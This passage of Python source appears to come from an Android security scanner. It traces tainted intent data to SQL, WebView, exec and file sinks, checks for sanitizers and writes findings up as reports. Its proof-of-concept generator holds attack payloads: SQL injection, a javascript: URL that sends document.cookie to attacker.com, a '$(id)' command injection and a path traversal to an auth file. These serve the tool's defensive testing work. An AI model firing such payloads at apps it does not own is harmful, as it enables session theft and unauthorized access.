            selector = f"{pkg}/{comp}"
        else:
            selector = comp

        extra_name = source.extra_name or "data"

        if sink.sink_type == "sql":
            payload = "' OR '1'='1"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "webview":
            payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "exec":
            payload = "$(id)"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "file":
            payload = "../../../../../../data/data/com.target.app/shared_prefs/auth.xml"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        else:
            payload = "attacker_controlled_value"
            extra_flag = f'--es "{extra_name}" "{payload}"'

        if source.component_type == "activity":
            cmd = f"adb shell am start -n {selector} {extra_flag}"
        elif source.component_type == "service":
            cmd = f"adb shell am startservice -n {selector} {extra_flag}"
        elif source.component_type == "receiver":
            actions = ""
            cmd = f"adb shell am broadcast -n {selector} {extra_flag}"
        elif source.component_type == "provider":
            authority = pkg if pkg else "com.example"
            if sink.sink_type == "sql":
                cmd = (
                    f'adb shell content query --uri content://{authority}/ '
                    f'--where "\' OR \'1\'=\'1"'
                )
            else:
                cmd = (
                    f'adb shell content query --uri content://{authority}/{payload}'
                )
        else:
            cmd = f"adb shell am start -n {selector} {extra_flag}"

        return cmd

    # ------------------------------------------------------------------
    # Sanitizer detection
    # ------------------------------------------------------------------

    def _check_sanitizers(self, flow: TaintFlow) -> bool:
        """
        Return True if a sink-appropriate sanitizer appears on the flow path.

        Only patterns relevant to the sink type count (e.g. selectionArgs for
        SQL, host allow-listing for WebView); generic checks such as
        TextUtils.isEmpty or length comparisons do not constrain content.
        """
        if self._call_graph is None:
            return False
        patterns = _SANITIZERS_BY_TYPE.get(flow.sink.sink_type, _DEFAULT_SANITIZERS)
        if not patterns:
            return False

        for hop in flow.hop_path:
            parts = hop.rsplit(".", 1)
            if len(parts) != 2:
                continue
            body = self._call_graph.method_bodies.get((parts[0], parts[1]), "")
            for san_pattern in patterns:
                if re.search(san_pattern, body, re.IGNORECASE):
                    return True
        return False


# ---------------------------------------------------------------------------
# Conversion to Finding
# ---------------------------------------------------------------------------

def to_finding(flow: TaintFlow) -> Finding:
    """Convert a TaintFlow to the standard Finding dataclass."""
    hops_formatted = " → ".join(flow.hop_path)
    extra = {
        "taint_flow": True,
        "hop_path": flow.hop_path,
        "source_api": flow.source.source_api,
        "sink_api": flow.sink.sink_api,
        "sink_type": flow.sink.sink_type,
        "is_sanitized": flow.is_sanitized,
        "extra_name": flow.source.extra_name,
        "data_flow": flow.data_flow,
        "confidence": ("low" if (flow.is_sanitized or flow.data_flow.startswith("unverified"))
                       else "high" if flow.data_flow in ("intra-method", "call-chain-verified") else "medium"),
    }

    sanitized_note = " [SANITIZED – may be FP]" if flow.is_sanitized else ""
    fid = (
        f"TAINT_{flow.sink.sink_type.upper()}_"
        f"{flow.source.component_class.split('.')[-1].upper()}"
    )

    attack_path = (
        f"Exported {flow.source.component_type} receives untrusted input via "
        f"{flow.source.source_api}({flow.source.extra_name!r}) → "
        f"data propagates through {len(flow.hop_path)} hop(s) → "
        f"reaches {flow.sink.sink_api} sink ({flow.sink.sink_type}).\n"
        f"Call chain: {hops_formatted}"
    )

    evidence = Evidence(
        file_path=flow.sink.file_path,
        line_number=flow.sink.line_number,
        snippet=flow.sink.code_snippet,
        matched_text=flow.sink.sink_api,
    )

    return Finding(
        fid=fid,
        title=flow.title + sanitized_note,
        severity=flow.severity,
        description=flow.description,
        attack_path=attack_path,
        adb_commands=[flow.poc_command],
        evidence=evidence,
        references=[
            "https://owasp.org/www-project-mobile-top-10/",
            "https://developer.android.com/topic/security/risks/intent-injection",
        ],
        extra=extra,
    )
